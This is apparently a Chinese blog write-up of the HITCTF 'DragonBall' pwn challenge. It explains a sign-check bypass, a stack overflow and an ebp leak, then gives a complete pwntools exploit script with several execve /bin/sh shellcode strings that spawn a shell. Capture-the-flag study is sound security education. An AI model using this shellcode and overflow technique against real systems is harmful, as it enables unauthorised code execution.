---
title: HITCTF DragoBall WP
date: 2018-08-02 08:37:40
tags: [CTF, PWN]
categories: PWN练习
---
# HITCTF DragonBall WP
​	这段时间打算刷下之前哈工大的pwn。今天是第一天，本来打算搞两三道的结果发现一个栈就看了一天，哎果然还是太菜了。
<!--more-->
	拿到题目先checksc看发现什么保护都没有开，判断应该是栈，扔ida一审发现他没有check负数，check的逻辑是当钱为0时不能购买Dragonball，但是这里可以通过买-卖-再买使钱数不能被5整除，这样的话就能绕过check进入wish函数。wish函数中有两个输入，其中一个可以溢出，但是只能刚好溢出到ret，一开始觉得rop的话利用起来应该会比较烦，毕竟它能溢出的字节数还是比较少，而且他这里没有开nx，应该是通过写shellcode来getshell。这样想后便往写shellcode上去看，发现可以通过控制ebp来控制wish函数中写入的位置，由于wish函数中两次获取用户输入都是一个ebp，gdb跟了一下发现可以同时控制往bss段和got段写任意值（由于bss段足够大），于是打算复写puts的got为shellcode在bss段的起始地址，这样当wish函数中最后调用puts的时候就回去执行shellcode。完美。
	emmmmm然而利用并没有成功。调了一下发现程序接收输入变成了从输出去接收，也就是read函数的fd变成了1，这样的话构造的字符串程序无法接收，但是这里第一次输入之后会输入目标空间中的值，也就是说这里我们可以得到程序的libc库。然后后来看了一下好像还是无法利用就先放弃了这个方法。  
	之后通过之前泄露libc库想到如果wish函数中第一次输入的时候将缓冲区填满，就能泄露ebp，一旦泄露ebp，栈上的所有地址都可以通过泄露的ebp+偏移得到，这时如果我们将shellcode布置在栈上，同时将ret复写为ebp-偏移，使ret指向栈上的那部分shellcode，我们就能getshell了。这里也有很多坑，主要就是程序输出的串没有接收导致进程阻塞之类的，还有就是最好不要去任意改变程序执行流程，这样可能会破坏栈结构，导致一些莫名其妙的问题，最后就是这里用shellcraft生成的shellcode好像不行，只好自己去网上找到能用的shellcode。
这道题应该还有其它的方法，等下次再填坑。

```
from pwn import *
context(log_level='debug',arch='i386',os='linux')
p=process('./DragonBall')
elf=ELF('./DragonBall')
gdb.attach(p,'''
	break *0x080487C0
	break *0x08048791
	continue
''')

def buy():
	p.recvuntil('You choice: ')
	p.sendline('1')

def sell():
	p.recvuntil('You choice: ')
	p.sendline('2')

def list():
	p.recvuntil('You choice: ')
	p.sendline('3')

#def wish():
#	p.recvuntil('You choice: ')
#	p.sendline('4')
#	p.recvuntil('Tell me your wish: ')
#	p.sendline('a'*0x68)
#	p.recvuntil('a'*0x68)
#	a=(u32(p.recv(4)))
#	p.recvuntil('(Y/N) ')
#	p.sendline(asm(shellcraft.sh())+(0x3c-len(asm(shellcraft.sh())))*'c'+p32(0x1234))
#
#def exit():
#	p.recvuntil('You choice: ')
#	p.sendline('5')

buy()
sell()
buy()
buy()
buy()
buy()
buy()
buy()
buy()
p.recvuntil('You choice: ')
p.sendline('4')
p.recvuntil('Tell me your wish: ')
p.sendline('a'*0x67)
p.recvuntil('a'*0x67)
a=(u32(p.recv(4)))
a='0xff'+(hex(a).replace('0x',''))[0:6]
print a
a=int(a,16)
p.recvuntil('(Y/N) ')
shellcode='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'
shellcode='jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
shellcode='\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
shellcode='\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'
#shellcode=asm(shellcraft.sh())
leng=len(shellcode)
#p.sendline((shellcode)+(0x3c-len((shellcode)))*'c'+p32(0x1234))
p.sendline(shellcode+'a'*(0x3c-leng)+p32(a-0x58))

p.interactive()

```

